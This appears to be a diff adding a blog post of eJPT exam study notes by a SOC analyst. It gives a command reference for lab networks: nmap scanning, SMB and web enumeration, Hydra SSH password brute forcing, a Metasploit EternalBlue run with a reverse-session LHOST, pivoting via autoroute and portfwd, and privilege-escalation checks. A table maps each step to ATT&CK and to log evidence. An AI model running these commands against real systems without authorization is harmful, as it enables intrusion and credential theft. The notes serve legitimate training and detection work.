@@ -1,0 +1,126 @@
+---
+title: 'eJPT field notes: method beats exploits'
+description: "INE's Junior Penetration Tester is a hands-on exam. The method, the commands worth keeping close, and what each step looks like from the SOC side."
+date: '2026-11-18'
+tags: [eJPT, Penetration Testing, Nmap, Metasploit]
+cert: eJPTv2
+---
+
+eJPT is INE's entry-level penetration testing certification. The exam is practical: you get a lab network in the browser and answer questions from what you find in it. I passed in June 2026.
+
+I work on the blue team, so the most useful thing it gave me wasn't a list of exploits. It was knowing what the other side of an alert looks like, which makes it much easier to judge whether something in a SIEM is a scan, a real attack or an admin having a bad day.
+
+These notes stick to the public exam objectives. Check INE's exam page for the current format and duration before you book.
+
+## What it covers
+
+INE lists four areas:
+
+- **Assessment methodologies**: information gathering, footprinting, scanning and enumeration.
+- **Host and network auditing**: finding weak configurations, credentials and exposed services.
+- **Host and network penetration testing**: exploitation, post-exploitation, privilege escalation and pivoting.
+- **Web application penetration testing**: discovering content, testing inputs and common web flaws.
+
+## The method
+
+Every host goes through the same loop: discover it, enumerate everything it runs, get in, look around, then see what it can reach that you couldn't. Write things down as you go. A lot of questions hinge on a detail you saw hours earlier and didn't think mattered.
+
+A simple table per network goes a long way:
+
+| Host | Open ports | Services and versions | Credentials | Notes |
+| --- | --- | --- | --- | --- |
+| 10.10.10.5 | 22, 80, 445 | OpenSSH 8.2, Apache 2.4.41, Samba | admin from web config | Can reach 172.16.5.0/24 |
+
+## Commands worth keeping close
+
+### Discovery
+
+```bash
+# Live hosts on a subnet
+nmap -sn 10.10.10.0/24
+
+# All TCP ports first, then versions and default scripts on what's open
+nmap -p- --min-rate 1000 -T4 10.10.10.5 -oN ports.txt
+nmap -sV -sC -p 22,80,445 10.10.10.5 -oN services.txt
+```
+
+### SMB and web
+
+```bash
+# Shares available without credentials
+smbclient -L //10.10.10.5 -N
+enum4linux -a 10.10.10.5
+
+# Hidden directories and files
+gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt -x php,txt
+```
+
+### Credentials
+
+Only after enumeration gives you a likely username. Spraying blindly is slow and noisy.
+
+```bash
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.5 -t 4
+```
+
+### Metasploit
+
+```bash
+msfconsole -q
+search type:exploit name:smb
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 10.10.10.5
+set LHOST 10.10.10.2
+run
+```
+
+### Pivoting
+
+Once you have a Meterpreter session on a host with a second network interface, route through it:
+
+```bash
+# Add a route to the internal subnet through session 1
+use post/multi/manage/autoroute
+set SESSION 1
+set SUBNET 172.16.5.0
+run
+
+# Scan the internal subnet through that route
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 172.16.5.0/24
+set PORTS 22,80,445,3389
+run
+
+# Forward one internal web server to your own machine, from inside the session
+portfwd add -l 8080 -p 80 -r 172.16.5.10
+```
+
+### Privilege escalation, first checks
+
+```bash
+# Linux
+sudo -l
+find / -perm -4000 -type f 2>/dev/null
+cat /etc/crontab
+```
+
+```powershell
+# Windows
+whoami /priv
+whoami /groups
+systeminfo
+```
+
+## The SOC side of each step
+
+This is the part I'd recommend to any analyst, even if you never take the exam. Every step above leaves a trace:
+
+| Step | MITRE ATT&CK | What it looks like in the logs |
+| --- | --- | --- |
+| Host discovery and port scans | T1046 Network Service Discovery | One source touching many hosts or ports in a short window; firewall denies; IDS scan signatures |
+| Directory brute forcing | T1595.003 Wordlist Scanning | A burst of 404s from one IP, often with a tool's default user agent |
+| Password guessing | T1110 Brute Force | Clusters of event 4625 on Windows, `Failed password` lines in Linux `auth.log` |
+| Exploiting a service | T1210 Exploitation of Remote Services | IDS alerts, and new processes running as SYSTEM with an unusual parent |
+| Pivoting | T1090 Proxy | An internal host that never scans anything suddenly scanning its own subnet |
+
+The last row is the one I'd remember. An external scan is background noise on the internet. An internal host behaving like a scanner almost never is.
